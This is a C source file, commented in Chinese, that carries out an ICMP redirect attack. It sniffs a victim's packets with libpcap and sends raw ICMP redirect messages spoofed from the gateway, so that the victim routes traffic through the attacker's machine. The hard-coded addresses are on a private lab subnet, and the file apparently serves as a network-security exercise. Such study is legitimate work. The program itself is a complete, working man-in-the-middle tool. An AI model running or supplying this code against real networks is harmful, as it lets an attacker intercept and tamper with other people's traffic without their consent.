#include <pcap.h>
#include <time.h>
#include <stdlib.h>
#include <stdio.h>
#include <netinet/in.h> 
#include <netinet/ip.h> 
#include <netinet/ip_icmp.h> 
#include<sys/socket.h>
#include<unistd.h>


#define MAX 1024
#define SIZE_ETHERNET 14

const unsigned char *Vic_IP = "192.168.64.131";//攻击对象的ip
const unsigned char *Ori_Gw_IP = "192.168.64.2";//源网关ip
const unsigned char *Redic_IP = "192.168.64.129";//攻击者ipo
int flag = 0;

/*计算校验和*/  
u_int16_t checksum(u_int8_t *buf,int len)  
{  
    u_int32_t sum=0;  
    u_int16_t *cbuf;  
  
    cbuf=(u_int16_t *)buf;  
  
    while(len>1)
    {  
        sum+=*cbuf++;  
        len-=2;  
    }  
  
    if(len)  
        sum+=*(u_int8_t *)cbuf;  
  
        sum=(sum>>16)+(sum & 0xffff);  
        sum+=(sum>>16);  
  
        return ~sum;  
}  


void ping_redirect(int sockfd,const unsigned char *data)
{ 
    char buf[MAX],*p;
    //struct ip_header *ip;
    //struct icmp_header *icmp;
    int len,i;
    //struct sockaddr_in dest; 
    struct packet{
        struct iphdr ip;
        struct icmphdr icmp;
        char datas[28];
    }packet;



    //手动填充ip头
    packet.ip.version = 4;
    packet.ip.ihl = 5;
    packet.ip.tos = 0;//服务类型
    packet.ip.tot_len = htons(56);
    packet.ip.id = getpid();
    packet.ip.frag_off = 0;
    packet.ip.ttl = 255;
    packet.ip.protocol = IPPROTO_ICMP;
    packet.ip.check = 0;
    packet.ip.saddr = inet_addr(Ori_Gw_IP);//要伪造网关发送ip报文
    packet.ip.daddr = inet_addr(Vic_IP);    //将伪造重定向包发给受害者
    
    

    //手动填充icmp头
    packet.icmp.type = ICMP_REDIRECT;
    packet.icmp.code = ICMP_REDIR_HOST;
    packet.icmp.checksum = 0;
    packet.icmp.un.gateway = inet_addr(Redic_IP);
    struct sockaddr_in dest =  {
        .sin_family = AF_INET,
        .sin_addr = {
            .s_addr = inet_addr(Vic_IP)
        }
    };
    //从源数据包的内存地址的起始地址开始，拷贝28个字节到目标地址所指的起始位置中
    //可以复制任何类型，而strcpy只能复制字符串
    memcpy(packet.datas,(data + SIZE_ETHERNET),28);//包里数据
    packet.ip.check = checksum(&packet.ip,sizeof(packet.ip));
    packet.icmp.checksum = checksum(&packet.icmp,sizeof(packet.icmp)+28);
    //用于非可靠连接的数据数据发送，因为UDP方式未建立SOCKET连接，所以需要自己制定目的协议地址
    //（发送端套接字描述符，待发送数据的缓冲区，待发送数据长度IP头+ICMP头（8）+IP首部+IP前8字节，flag标志位，一般为0，数据发送的目的地址，地址长度）
    sendto(sockfd,&packet,56,0,(struct sockaddr *)&dest,sizeof(dest));
    //printf("send\n");
}



//pcap_loop()不知道如何处理返回值，所以返回值为空，第一个参数是回调函数的最后一个参数，第二个参数是pcap.h头文件定义的，包括数据包被嗅探的时间大小等信息，最后一个参数是一个u_char指针，它包含被pcap_loop()嗅探到的所有包（一个包包含许多属性，它不止一个字符串，而是一个结构体的集合，如一个TCP/IP包包含以太网头部，一个IP头部还有TCP头部，还有此包的有效载荷）这个u_char就是这些结构体的串联版本。pcap嗅探包时正是用之前定义的这些结构体
void getPacket(u_char * arg, const struct pcap_pkthdr * pkthdr, const u_char * packet)
{
    int sockfd,res;
    int one = 1;
    int *ptr_one = &one;
    //printf("here!\n");
    //可以接收协议类型为ICMP的发往本机的IP数据包（通信的域，iPv4,套接字通信的类型，原始套接字，套接字类型，接收ICMP-》IP）
    //sockfd是socket描述符，为了以后将socket与本机端口相连
    if((sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_ICMP))<0)
    {
        printf("create sockfd error\n");
        exit(-1);
    }
    //包装自己的头部
    //发送数据时，不执行系统缓冲区到socket缓冲区的拷贝，以提高系统性能，应为
    /**
     设置sockfd套接字关联的选 项
     sockfd:指向一个打开的套接口描述字
     IPPROTO_IP：指定选项代码的类型为IPV4套接口
     IP_HDRINCL：详细代码名称（需要访问的选项名字）
     ptr_one：一个指向变量的指针类型，指向选项要设置的新值的缓冲区
     sizeof(one)：指针大小
    */
    //开启IP_HDRINCL选项，让用户自己生成IP头部的数据
    res = setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL,ptr_one, sizeof(one));   
    if(res < 0)
    {
        printf("error--\n");
        exit(-3);
    }
    ping_redirect(sockfd,packet);

}


int main()
{
    char errBuf[PCAP_ERRBUF_SIZE], * devStr;

    /* get a device */
    devStr = pcap_lookupdev(errBuf);//返回一个合适网络接口的字符串指针，如果出错，则返回errBuf出错字符串，长度为PACP_ERRBUF_SIZE长度

    if(devStr)
    {
        printf("success: device: %s\n", devStr);
    }
    else
    {
        printf("error: %s\n", errBuf);
        exit(1);
    }

    /* open a device, wait until a packet arrives */
    //打开设备进行嗅探，返回一个pcap_t类型的指针，后面操作都要用到这个指针
    pcap_t * device = pcap_open_live(devStr, 65535, 1, 0, errBuf);     //获得数据包捕获描述字函数（设备名称，参与定义捕获数据的最大字节数，是否置于混杂模式，设置超时时间0表示没有超时等待，errBuf是出错返回NULL时用于传递错误信息）

    struct bpf_program filter;
    char filterstr[50]={0};
    sprintf(filterstr,"src host %s",Vic_IP);        //将vic_ip按照%s的格式写入filterstr缓冲区
    //过滤通信，哪些包是用户可以拿到的
    //表达式被编译，编译完就可使用了
    pcap_compile(device,&filter,filterstr,1,0);  //函数返回-1为失败，返回其他值为成功
    //device:会话句柄
    //&filterstr:被编译的过滤器版本的地址的引用
    //filterstr:表达式本身,存储在规定的字符串格式里
    //1:表达式是否被优化的整形量：0：没有，1：有
    //0：指定应用此过滤器的网络掩码
    //设置过滤器，使用这个过滤器
    pcap_setfilter(device,&filter);
    //device:会话句柄
    //&filterstr:被编译的表达式版本的引用
    /* wait loop forever */
    int id = 0;
    pcap_loop(device, -1, getPacket, NULL);
    //device是之前返回的pacp_t类型的指针，-1代表循环抓包直到出错结束，>0表示循环x次，getPacket是回调函数，最后一个参数一般之置为null
    
    
    return 0;
}
